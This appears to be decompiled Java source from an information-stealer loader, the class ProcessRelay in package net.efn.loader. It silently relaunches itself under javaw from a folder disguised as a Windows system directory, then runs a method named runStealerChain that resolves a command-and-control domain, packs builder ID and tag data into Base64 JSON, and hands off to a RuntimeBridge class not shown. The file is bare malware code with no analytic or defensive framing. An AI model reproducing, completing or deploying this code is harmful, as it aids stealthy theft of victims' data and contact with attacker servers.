package net.efn.loader;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

public class ProcessRelay {

    public static void main(String[] var0) {
        if (var0.length > 0) {
            String var10000 = var0[0];
            if (!var10000.equals("-restarted")) {
                RuntimeBridge.main(var0);
                return;
            }
        }
        for (String var4 : var0) {
            if (var4.equals("-restarted")) {
                runStealerChain();
                return;
            }
        }
        try {
            String var29 = System.getProperty("java.home");
            String[] var10001 = new String[] { "bin", null };
            var10001[1] = "javaw.exe";
            Path var30 = Path.of(var29, var10001);
            if (!Files.exists(var30)) {
                var10001 = new String[] { "bin", null };
                var10001[1] = "java.exe";
                var30 = Path.of(var29, var10001);
            }
            String var31 = new File(ProcessRelay.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            String var33 = System.getenv("LOCALAPPDATA");
            var10001 = new String[3];
            var10001[0] = "Microsoft";
            var10001[1] = "Windows";
            var10001[2] = "NtProfileIndex";
            Path var32 = Path.of(var33, var10001);
            Files.createDirectories(var32);
            String var5 = ProcessRelay.class.getName();
            String[] var10002 = new String[] { var30.toString(), "-cp", var31, var5, null };
            var10002[4] = "-restarted";
            ProcessBuilder var6 = new ProcessBuilder(var10002);
            var6.redirectInput(Redirect.from(new File("NUL")));
            var6.redirectOutput(Redirect.appendTo(var32.resolve("_spawn.log").toFile()));
            var6.redirectErrorStream(true);
            var6.directory(var32.toFile());
            var6.start();
        } catch (Exception var28) {
        }
    }

    private static void runStealerChain() {
        RuntimeBridge var0 = new RuntimeBridge();
        String var1 = var0.resolveC2Domain();
        String var2 = RuntimeBridge.builderUserId();
        String var3 = RuntimeBridge.builderTag();
        String var10000 = jsonEscape(var2);
        String var10001 = jsonEscape(var3);
        String var8 = jsonEscape(var1);
        String var7 = var10001;
        String var6 = var10000;
        StringBuilder var16 = new StringBuilder();
        StringBuilder var17 = var16.append("{\"userId\":\"").append(var6);
        StringBuilder var18 = var17.append("\",\"tag\":\"").append(var7);
        StringBuilder var19 = var18.append("\",\"domain\":\"").append(var8);
        String var4 = var19.append("\",\"env\":\"DoubleClick\"}").toString();
        String var5 = Base64.getEncoder().encodeToString(var4.getBytes(StandardCharsets.UTF_8));
        RuntimeBridge.main(new String[] { var5 });
    }

    private static String jsonEscape(String var0) {
        if (var0 == null) {
            return "";
        } else {
            StringBuilder var1 = new StringBuilder();
            for (char var5 : var0.toCharArray()) {
                switch(var5) {
                    case '\t':
                        var1.append("\\t");
                        break;
                    case '\n':
                        var1.append("\\n");
                        break;
                    case '\r':
                        var1.append("\\r");
                        break;
                    case '"':
                        var1.append("\\\"");
                        break;
                    case '\\':
                        StringBuilder var6 = new StringBuilder();
                        var6.append('\\');
                        var6.append('\\');
                        var1.append(var6.toString());
                        break;
                    default:
                        if (var5 < ' ') {
                            var1.append(String.format("\\u%04x", Integer.valueOf(var5)));
                        } else {
                            var1.append(var5);
                        }
                }
            }
            return var1.toString();
        }
    }
}
